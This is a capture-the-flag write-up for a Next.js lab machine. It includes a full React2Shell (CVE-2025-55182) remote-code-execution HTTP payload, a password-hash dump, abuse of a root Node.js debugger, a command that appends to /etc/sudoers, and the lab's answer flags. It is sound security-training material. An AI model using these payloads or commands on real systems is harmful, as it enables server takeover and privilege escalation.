## Reactor 

### Recon

<img width="821" height="420" alt="Screenshot 2026-06-28 at 01 52 17" src="https://github.com/user-attachments/assets/794ac3c4-4425-4b24-9364-84a4910513fc" />

```
open ports ::

22 - ssh 
3000 - mostly used for running javascript based websites (not default)
```

### port - 3000

<img width="1373" height="807" alt="Screenshot 2026-06-28 at 02 28 51" src="https://github.com/user-attachments/assets/d6e7f0a6-02a2-4513-8565-f8f59d79b097" />


the nmap response for the port 3000

X-Powered-By:\x20Next\.js\r\n... -- X-Powered-By: Next.js

this says that this site uses next.js.

### next.js

in general the node.js acts as backend language communicating with webserver and database. React is used for frontend along with html and css.

**React.js** - will have components(react components) which replaces the DOM manipulation in previous js , here react will change the UI elements instantly without refreshing the page.

**Next.js** -- this runs the node.js in the backend which will have api routes and databases. and uses react components to build the DOM structure and sends the output html to the browser. here **instead of downloading the js files into browser, single code will handle both frontend and backend.**

version -- 15.0.3

### REACT2SHELL - CVE 2025-55182 and CVE 2025-66478

critical security vulnerbility in React Server Components.
The flaw lies in React's "Flight" protocol serialization. The server fails to validate incoming HTTP payloads. Attackers can inject a malicious object graph. When deserialized, the server executes it as trusted code.

POC -- https://github.com/l4rm4nd/CVE-2025-55182

### Exploit
```
POST / HTTP/1.1
Host: reactor.htb:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

<img width="910" height="382" alt="image" src="https://github.com/user-attachments/assets/1d32eccf-1e79-43ef-b836-9aafa9f5ac6c" />

```
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```
got the reactor.db into our system and read the database file.

```sqlite3 local_reactor.db "SELECT * FROM users;" ```

users in the database
```
users           hashed_passwd                        passwd
admin           a203b22191d744a4e70ada5c101b17b8    not crackable using hashcat
engineer        39d97110eafe2a9a68639812cd271e8e    reactor1
```

SSH for engineer user

get the user flag.

``` user flag :: effe03a96d3ce6915361101eb27ae945 ```

services running by the engineer user.

``` ss-tulnp```

<img width="1340" height="248" alt="Screenshot 2026-06-28 at 11 18 48" src="https://github.com/user-attachments/assets/64be0dea-26fa-48aa-8f5f-dedca2e251fd" />

port 9229 - port used by node.js debugger (inspector tool)

node.js is a backend language so it will inherit permissions of the user who created it and the inspector tool also part of the node.js so it will also inherit permissions to execute commands. 

using this debugger we can execute commands as the user who created it.

invoking the inspector debugger
```
node inspect 127.0.0.1:9229
```

executing commands (RCE)
```
debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")

user :: root
```

updating sudoers file to make engineer user a sudo user.

```
exec("process.mainModule.require('child_process').execSync('echo \"engineer ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers')")
```

``` sudo -i ``` - got the root user permissions
<img width="385" height="149" alt="Screenshot 2026-06-28 at 11 48 57" src="https://github.com/user-attachments/assets/84eabd55-321f-4f36-869d-85cba31dd0c2" />

```
root flag :: 3731f6ba5314d880ec393ed96b2bb773
```


